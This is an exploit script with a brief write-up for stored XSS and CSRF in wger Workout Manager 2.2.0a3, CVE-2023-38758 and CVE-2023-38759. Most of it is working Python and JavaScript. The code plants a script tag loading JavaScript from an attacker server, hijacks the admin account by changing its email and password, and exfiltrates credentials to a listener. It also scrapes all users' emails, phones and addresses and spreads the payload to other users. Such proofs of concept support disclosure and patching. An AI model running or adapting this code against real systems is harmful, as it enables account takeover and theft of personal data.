# Exploit Title: wger Workout Manager 2.2.0a3 - Stored Cross-Site Scripting (XSS) & Authentication Bypass via CSRF
# CVE-2023-38758 & CVE-2023-38759
# Date: July 2023
# Exploit Author: Rowan Crowley
# Vendor Homepage: https://wger.de/en/software/about-us
# Software Link: https://github.com/wger-project/wger
# Version: 2.2.0a3
# Impact: XSS is sent directly to admin - leads to Full Authentication Bypass, Information Disclosure, and Account Takeover via CSRF


'''
## Steps to Reproduce:
1. Register for new account
2. Go to Nutrition > Ingredient Overview > Add New Ingredient
3. Create new ingredient with your stored XSS payload in the License Author field, and submit the new ingredient.
Alternate Vector: Add stored XSS payload to the Ingredient Name.

As soon as the admin views the pending new ingredient request, the XSS payload (from the License Author field) will be triggered. The following script automates this process, with a custom payload that fully hijacks the application. 

Another option is placing a payload within the Ingredient Name field, but that vulnerability is not the focus of this POC. That payload would only be triggered if the ingredient were approved, and then popped up in the ingredient search results.


## Additional XSS Vulnerability (Ingredient Name):
-The ingredient name field is also vulnerable to stored XSS via the ingredient search feature.
-Instead of putting the XSS payload in the License Author field, the attacker could include the payload within the Ingredient Name. Any user could create a new ingredient with this. If the admin account was already compromised, the attacker could also edit an existing ingredient's name in order to target any user who may inadvertently search for that ingredient.
-This XSS payload is triggered as soon as this ingredient name pops up in the search suggestions box via the search on the Ingredient Overview page, or the ingredient search when adding to a meal plan within the Nutrition Plan section. For these payloads to be triggered, the ingredient would already have to be approved.


## In-Depth Explanation (Primary Vulnerability):
-The license_author field in the add-ingredient feature is vulnerable to stored XSS that can hijack any user's account via CSRF.
-Any user with an account can submit a new ingredient, and these accounts are open for public registration.
-Upon submission of a new ingredient, this request is sent to the Administrator for approval. As soon as the Administrator views this pending request, the XSS payload is triggered.
-Using the following POC script, the admin is immediately locked out, and the XSS payload is by default then enabled for any user to potentially view and trigger by viewing the ingredient.
-The public ingredient inventory is sorted alphabetically, and crafting the new ingredient name with certain characters can place it at the top of the list, making it more likely to be viewed and payload triggered.
-This script registers a new user and creates a new ingredient with a stored XSS payload in the form of a CSRF script that performs the following:
    -Checks the user that triggered the payload and whether they're an admin (should be true for first victim)
    -Grabs the user's email address
    -Changes the user's email address
    -If the user is admin (id of 1):
        -Changes the user's password, immediately locking them out
        -Scrapes data for all other user accounts
    -Exfils this data back to the attacker's server
-Upon receiving confirmation of the payload being triggered, if left as default, this Python script continues by:
    -Enabling the XSS payload for all users (by logging in as admin and approving the pending new ingredient)
    -Continuing to host the payload and exploit new users as they trigger it
    -For each additional user exploited, the user's email address is changed and a password reset request is sent to this new email address. As this is an attacker-controlled address, additional functionality could be added to then immediately approve this request and reset the user's password (for non-admin users; admin passwords are able to be reset directly via CSRF).
      
'''

import socket, re, sys, requests, random, os, time
from bs4 import BeautifulSoup
from multiprocessing import Process

###ADJUST PARAMETERS HERE:###
tgtIP = '127.0.0.1'
tgtPort = 8000
attackerIP = '192.168.x.x'
XSSPayloadPort = 80     #local - hosts the XSS/CSRF payload
exfilPort = 4444        #local - listens and receives the data exfil
attackerEmail = 'attacker@attacker.com'
SCRAPE_USER_ACCOUNTS = True     #Grab details from admin's user list page - could take a while for large applications
TARGET_ADDITIONAL_USERS = True  #choose whether to only target the administrator or enable payload against all users
REQUEST_PASSWORD_RESET = True   #only applies if TARGET_ADDITIONAL_USERS = True; only affects additional (non-admin) users
randInt = random.randrange(100,9999)    #used for randomizing usernames, emails, payload files, etc. between exploit sessions
payloadFile = 's%s.js' % randInt        #local XSS/CSRF payload file created & hosted
language = 'en'     #part of application endpoint paths
XSSpayload = '<script src=http://%s:%s/%s></script>' % (attackerIP, XSSPayloadPort, payloadFile)
##############################

session = requests.session()
userList = dict()

CSRFPayloadScript = """
var exfilURL = 'http://%s:%s/';
var resetURL = "/%s/gym/user/1/reset-user-password";
var userURL = "/%s/dashboard";
var emailURL = "/%s/user/preferences";
var user, newPass, token, oldEmail;
var email = "%s";
var randInt = "%s";
var isAdmin = 0;

//Check current user that triggered the payload:
function getUser() {
    console.log('Starting getUser');
    var xhr1 = new XMLHttpRequest();
    xhr1.responseType = "document";
    xhr1.open("GET", userURL, true);
    xhr1.onload = function (e) {
        if (xhr1.readyState === XMLHttpRequest.DONE && xhr1.status === 200) {
            page1 = xhr1.response;
            // Get the user
            var usernameRegex = /\/calendar\/(.*)/;
            user = page1.querySelectorAll('a[href*="/calendar/"]')[0].href.match(usernameRegex)[1];
            email = email.replace("@", "."+randInt+"."+user+"@");
            console.log("The user is: " + user);
            if (page1.getElementsByTagName('html')[0].innerHTML.includes("user/list")) {
                isAdmin = 1;
                console.log('The user is an Admin!');
            }
            getEmail();
        }
    };
    xhr1.send(null);
}

//Scrape user's current email address:
function getEmail() {
    console.log('Starting getEmail');
    var xhr2 = new XMLHttpRequest();
    xhr2.responseType = "document";
    xhr2.open("GET", emailURL, true);
    xhr2.onload = function (e) {
        if (xhr2.readyState === XMLHttpRequest.DONE && xhr2.status === 200) {
            page2 = xhr2.response;
            // Get the email
            var emailRegex = /\/calendar\/(.*)/;
            oldEmail = page2.getElementById('id_email').value;
            console.log("The current email is: " + oldEmail);
        }
        scrapeCSRFToken();
    };
    xhr2.send(null);
}

//Grab CSRF token to use for email reset:
function scrapeCSRFToken() {
    console.log('Starting scrapeCSRFToken');
    var xhr3 = new XMLHttpRequest();
    xhr3.responseType = "document";
    xhr3.open("GET", emailURL, true);
    xhr3.onload = function (e) {
        if (xhr3.readyState === XMLHttpRequest.DONE && xhr3.status === 200) {
            page3 = xhr3.response;
            token = page3.getElementsByName('csrfmiddlewaretoken')[0].value;
            console.log('CSRF Token: ' + token);
            //exfil('token='+token);
            changeUserEmail();
        }
    };
    xhr3.send(null);
}

//Change user's email to the following format: attacker.<RandInt>.<username>@attacker.com
function changeUserEmail() {
    console.log('Starting changeUserEmail');
    var xhr4 = new XMLHttpRequest();
    xhr4.open("POST", emailURL, true);
    xhr4.withCredentials = true;
    xhr4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr4.onload = function (e) {
        resetPass();
    };
    xhr4.send("csrfmiddlewaretoken=" + token + "&email=" + email + "&first_name=" + "&last_name=" + "&birthdate=" + "&workout_reminder=14" + "&workout_duration=12" + "&notification_language=2" + "&weight_unit=kg" + "&show_comments=on" + "&show_english_ingredients=on" + "&num_days_weight_reminder=0" + "&submit=Save");
    console.log('Email changed to: ' + email);
}

//Reset user's password (only possible for admins - trainer privilege?):
function resetPass() {
    console.log('Starting resetPass');
    if (isAdmin) {
        var xhr5 = new XMLHttpRequest();
        xhr5.responseType = "document";
        xhr5.open("GET", resetURL, true);
        xhr5.onload = function (e) {
            if (xhr5.readyState === XMLHttpRequest.DONE && xhr5.status === 200) {
                page5 = xhr5.response;
                // Get the new password
                newPass = page5.getElementsByTagName('td')[1].innerHTML;
                console.log("The new password is: " + newPass); 
            }
            exfil();
        };
        xhr5.send(null);
    } else {
        newPass = '';
        exfil();
    }
}

//Send data back to attacker server:
function exfil() {
    console.log('Starting exfil');
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    data = 'user='+user+'&newEmail='+email+'&pass='+newPass+'&oldEmail='+oldEmail+'&isAdmin='+isAdmin;
    xhr.open("GET", exfilURL+data, true);
    xhr.send(null);
}

getUser();
""" % (attackerIP, exfilPort, language, language, language, attackerEmail, randInt)

with open(payloadFile, "w") as f:
    f.write(CSRFPayloadScript)

def scrapeCSRFtoken(url, Session):
    r = Session.get(url)
    src = r.content
    soup = BeautifulSoup(src, 'html.parser')
    csrfTokenTag = str([tag for tag in soup.find_all("input") if 'csrfmiddlewaretoken' in str(tag)][0])
    csrfToken = re.findall(r'value="(.*)"', csrfTokenTag)[0]
    return csrfToken

#Create new user to post payload:
def registerUser():
    print('(+) Registering New User...')
    registerurl = 'http://%s:%s/%s/user/registration' % (tgtIP, tgtPort, language)
    dashboardurl = 'http://%s:%s/%s/dashboard' % (tgtIP, tgtPort, language)
    csrfToken = scrapeCSRFtoken(registerurl, session)
    username = "testuser%s" % randInt
    password = "password%s!" % randInt
    email = "email%s@email.com" % randInt
    Data = {"csrfmiddlewaretoken": csrfToken, "username": username, "email": email, "password1": password, "password2": password, "submit": "Register"}
    session.post(registerurl, data=Data)
    r = session.get(dashboardurl, allow_redirects=False)
    if r.status_code == 200:
        print('\t(+) New User Registered: %s, %s, %s' % (username,password,email))
    else:
        print('\t(-) User registration failed, trying again...')
        registerUser()

#Post XSS payload in license_author field within ingredient-add feature:
def postPayload():
    global payloadIndex, payloadURL
    print('\n(+) Posting XSS Payload...')
    ingredienturl = 'http://%s:%s/%s/nutrition/ingredient/add/' % (tgtIP, tgtPort, language)
    csrfToken = scrapeCSRFtoken(ingredienturl, session)
    newIngredient = "!MYINGREDIENT%s" % randInt     #starting with '!' makes it show first in the ingredient list - more likely to be clicked!
    Data = {"csrfmiddlewaretoken": csrfToken, "name": newIngredient, "brand": '', "energy": "17", "protein": "1", "carbohydrates": "1", "carbohydrates_sugar": '', "fat": "1", "fat_saturated": '', "fibres": '', "sodium": '', "license": "2", "license_author": XSSpayload, "submit": "Save"}
    r = session.post(ingredienturl, data=Data)
    payloadIndex = re.findall(r'ingredient/(.*)/view', r.url)[0]
    payloadURL = r.url
    print('\t(+) Payload Posted: Ingredient Index: %s, Name: %s' % (payloadIndex, newIngredient))
    print('\t%s' % payloadURL)
    print('\t(...) Waiting for Admin to Trigger...\n')

#Host XSS/CSRF payload:
def startHTTPServer(ip, port):
    try:
        # Python 2
        from SimpleHTTPServer import SimpleHTTPRequestHandler
        import SocketServer
        httpd = SocketServer.TCPServer((ip, port), SimpleHTTPRequestHandler)
    except ImportError:
        # Python 3
        from http.server import HTTPServer, SimpleHTTPRequestHandler
        httpd = HTTPServer((ip, port), SimpleHTTPRequestHandler)    
    httpd.serve_forever()

#Host XSS/CSRF payload:
def serveExploit(ip, port):
    global webProcess
    webProcess = Process(target=startHTTPServer, args=(ip, port))
    webProcess.start()

#Receive & parse data exfil:
def listenForExfil(ip,port):
    global webProcess, payloadURL
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listening = False
    while not listening:
        try:
            s.bind((ip, port))
            s.listen(1)
            listening = True
        except:     #delay required to reopen socket in Time_Wait from last exfil
            print('(-) Waiting to reopen listener on port %s...' % port)
            time.sleep(20)
    print("(+) Hosting XSS payload: Port %s; Listening for data exfil: Port %s" % (XSSPayloadPort, exfilPort))
    print('\t(+) Vulnerable Page: %s\n' % payloadURL)
    conn, addr = s.accept()
    print('(+++) PAYLOAD TRIGGERED! Connection received from ',addr)
    while True:
        ans = conn.recv(1024).decode()
        #sys.stdout.write(ans)
        if 'pass=' in ans:
            user = newPass = oldEmail = newEmail = isAdmin = None
            try:
                user=re.findall("user=(.+)&newEmail", ans, re.MULTILINE)[0]
                isAdmin=int(re.findall("isAdmin=(.+) ", ans, re.MULTILINE)[0])
                print('\t*** User: %s' % user)
                if isAdmin:
                    print('\t*** User is ADMIN!')
            except:
                print('\tDidn\'t receive username...')
            if isAdmin:
                try:
                    newPass=re.findall("pass=(.+)&oldEmail", ans, re.MULTILINE)[0]
                    print('\t*** Password Changed: %s' % newPass)
                except:
                    print('\tDidn\'t receive new password...')
            if 'newEmail' in ans and 'oldEmail' in ans:
                try:
                    oldEmail=re.findall("oldEmail=(.+)&isAdmin", ans, re.MULTILINE)[0]
                    newEmail=re.findall("newEmail=(.+)&pass", ans, re.MULTILINE)[0]
                    print('\t*** Email: %s' % oldEmail)
                    print('\t*** Email Changed: %s' % newEmail)
                    print('\t(+) Account hijacked!')
                except:
                    print('\tDidn\'t receive old and/or new email...')
            webProcess.terminate()
            return (user, newPass, oldEmail, newEmail)

#Login with new creds to confirm working:
def loginAsUser(user, newPass):
    print('\t(...) Making sure it works...')
    loginurl = 'http://%s:%s/%s/user/login' % (tgtIP, tgtPort, language)
    adminurl = 'http://%s:%s/%s/user/list' % (tgtIP, tgtPort, language)
    userurl = 'http://%s:%s/%s/dashboard' % (tgtIP, tgtPort, language)
    csrfToken = scrapeCSRFtoken(loginurl, session)
    Data = {"csrfmiddlewaretoken": csrfToken, "username": user, "password": newPass, "submit": "Login"}
    session.post(loginurl, data=Data)
    if 'admin' in user.lower():
        r = session.get(adminurl, allow_redirects=False)
        if r.status_code == 200:
            print('\t(+) Authentication as Admin Successful!')
    else:
        r = session.get(userurl, allow_redirects=False)
        if r.status_code == 200:
            print('\t(+) Authentication as user %s Successful!' % user)

#Grab list of users, then scrape each user's profile page - could take a while for large databases:
def scrapeUserAccounts():
    print('\n(...) Scraping user list, could take a while...')
    userListURL = 'http://%s:%s/%s/user/list' % (tgtIP, tgtPort, language)
    r = session.get(userListURL)
    soup = BeautifulSoup(r.content, 'html.parser')
    userTags = [tag for tag in soup.find_all("a") if 'user' in str(tag) and 'overview' in str(tag)]
    activeCount = 0
    for usertag in userTags:
        userNumber = int(re.findall(r'user\/(.*)\/overview', str(usertag))[0])
        userName = re.findall(r'overview">(.*)<', str(usertag))[0]
        userProfilePath = re.findall(r'href="(.*)"', str(usertag))[0]
        fullUserProfileURL = 'http://%s:%s%s' % (tgtIP, tgtPort, userProfilePath)
        r2 = session.get(fullUserProfileURL)
        soup2 = BeautifulSoup(r2.content, 'html.parser')
        userDetailsTable = [Tag for Tag in soup2.find_all("table") if 'Email' in str(Tag)][0]
        userDetailsTags = [Tag for Tag in userDetailsTable.find_all("tr")]
        for detailTag in userDetailsTags:       #<tr> tags
            dataTag = [Tag for Tag in detailTag.find_all("td")][1]      #<td> tag
            dataString = str(dataTag).replace('\n', '')
            if 'Name' in str(detailTag):   
                userFirstName = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Last name' in str(detailTag):
                userLastName = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Email' in str(detailTag):
                try:
                    userEmail = re.findall(r'mailto:(.*)">', dataString)[0].strip()   
                except:
                    userEmail = "-/-"
            elif 'Phone' in str(detailTag):
                userPhone = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Address' in str(detailTag):
                userAddress = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Registered' in str(detailTag):
                userRegisterDate = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Last login' in str(detailTag):
                userLastLogin = re.findall(r'td>(.*)</', dataString)[0].strip()   
            elif 'Status' in str(detailTag):
                userStatus= re.findall(r'td>(.*)</', dataString)[0].strip() 
                if userStatus == 'Active':
                    activeCount+=1
        userRecord = {'Username': userName, 'Profile Path': userProfilePath, 'First': userFirstName, 'Last': userLastName, 'Email': userEmail, 'Phone': userPhone, 'Address': userAddress, 'Registration Date': userRegisterDate, 'Last Login': userLastLogin, 'Status': userStatus}
        userList[userNumber] = userRecord
    print('(+) %s User Accounts Scraped, %s are Active' % (len(userList), activeCount))
    if activeCount < 500:
        for u in userList:
            display = dict()
            if userList[u]['Status'] == 'Active':
                for k,v in userList[u].items():
                    if len(v) > 0 and "-/-" not in v and k != 'Profile Path' and 'First' not in k and 'Last' not in k and 'Status' not in k and 'Date' not in k:
                        display[k] = v
            print('\tID %s: %s' % (u, display))
    else:
        print('(+) Too many to print!')


#Enable payload so any user could view it (approve the pending new ingredient):
def enablePayloadForAllUsers():
    print('\n(+) Enabling payload for all users...')
    global payloadIndex
    payloadURL = 'http://%s:%s/%s/nutrition/ingredient/%s/accept/' % (tgtIP, tgtPort, language, payloadIndex)
    session.get(payloadURL)
    print('\tSuccess!')
    print('\n(+) Waiting for additional users to trigger...')

#Request password reset token to new email address:
def requestPasswordReset(newEmail):
    print('\t(...) Requesting password reset for %s...' % newEmail)
    passResetURL = 'http://%s:%s/%s/user/password/reset/' % (tgtIP, tgtPort, language)
    session2 = requests.session()
    csrfToken = scrapeCSRFtoken(passResetURL, session2)
    Data = {"csrfmiddlewaretoken": csrfToken, "email": newEmail, "submit": "Save"}
    session2.post(passResetURL, data=Data)
    print('\t(+) Request submitted, check your email!\n')

def main():
    registerUser()
    postPayload()
    serveExploit("0.0.0.0",XSSPayloadPort)
    (user, newPass, oldEmail, newEmail) = listenForExfil("0.0.0.0",exfilPort)
    loginAsUser(user, newPass)
    if SCRAPE_USER_ACCOUNTS:
        scrapeUserAccounts()
    if TARGET_ADDITIONAL_USERS:
        enablePayloadForAllUsers()
        while True:
            serveExploit("0.0.0.0",XSSPayloadPort)
            (user, n, oldEmail, newEmail) = listenForExfil("0.0.0.0",exfilPort)
            if REQUEST_PASSWORD_RESET and newEmail:
                requestPasswordReset(newEmail)
    
main()

